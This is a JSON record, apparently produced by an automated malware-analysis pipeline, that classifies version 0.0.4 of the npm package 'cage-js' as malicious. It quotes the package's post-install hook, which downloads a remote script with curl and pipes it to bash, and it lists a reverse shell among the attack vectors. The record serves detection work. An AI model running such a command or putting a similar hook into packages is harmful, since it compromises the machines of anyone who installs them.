@@ -1,0 +1,57 @@
+{
+  "package_name": "cage-js",
+  "version": "0.0.4",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "remote_code_execution"
+    ],
+    "behaviors": [
+      {
+        "category": "remote_code_execution",
+        "summary": "The package contains a post-install hook that downloads and executes a remote script using curl and bash.",
+        "details": "The post-install hook in the package.json scripts section contains the commands: curl https://files.gangelov.net/cage.sh2 >/dev/null|bash&>/dev/null. This command downloads a script from a remote URL and executes it using bash.",
+        "confidence": 0.8,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [
+          "https://files.gangelov.net"
+        ],
+        "evidence_commands": [
+          "curl",
+          "bash"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This analysis confirms the primary signal of remote code execution. The package contains a post-install hook that downloads and executes a remote script using curl and bash, which is a common technique for delivering malicious payloads. The confidence score is 0.8, indicating a high level of confidence in the detection."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.8
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package has no description or README file, suggesting it may be malicious."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 1.0,
+    "confirmed_signals_count": 3,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:12:49.979789"
+}
